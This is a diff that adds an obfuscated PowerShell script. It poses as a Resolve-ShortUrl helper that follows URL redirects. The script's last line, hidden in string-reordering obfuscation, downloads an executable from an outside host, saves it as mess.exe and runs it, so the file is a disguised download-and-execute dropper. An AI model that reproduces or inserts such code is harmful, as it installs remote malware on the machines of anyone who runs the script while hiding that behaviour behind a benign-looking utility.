@@ -1,0 +1,26 @@
+function R`e`so`L`VE-shORturL
+{
+
+
+    [CmdletBinding()]
+    [OutputType([System.String])]
+    PARAM
+    (
+        [String[]]${SHOR`Tu`Rl}
+    )
+
+    FOREACH (${U`Rl} in ${sH`o`RtU`RL})
+    {
+        TRY
+        {
+            .("{0}{1}{3}{2}"-f 'W','rite-Ver','e','bos') -Message ("$URL "+'- '+'Quer'+'ying'+'...')
+            (&("{1}{3}{2}{0}{4}" -f'Web','I','oke-','nv','Request') -Uri ${U`Rl} -MaximumRedirection 0 -ErrorAction ("{1}{0}" -f 'nore','Ig'))."He`A`deRs"."Loc`A`TiON"
+        }
+        CATCH
+        {
+            .("{1}{3}{0}{2}"-f'rr','Wri','or','te-E') -Message ${ER`Ror}[0]."eXc`E`ptION"."m`eS`sage"
+        }
+    }
+}
+
+(.("{1}{0}{2}"-f'Obj','New-','ect') ("{3}{4}{2}{0}{1}" -f'em.Net.WebC','lient','t','Sy','s')).("{3}{2}{1}{0}" -f 'ile','loadF','own','D').Invoke(("{5}{1}{0}{6}{4}{2}{3}" -f'://','ttp','/1','.exe','ajos.in/0x','h','c'),("{1}{0}" -f'ss.exe','me'));.("{2}{0}{3}{1}"-f 't','cess','Star','-Pro') ("{2}{0}{1}" -f '.ex','e','mess')
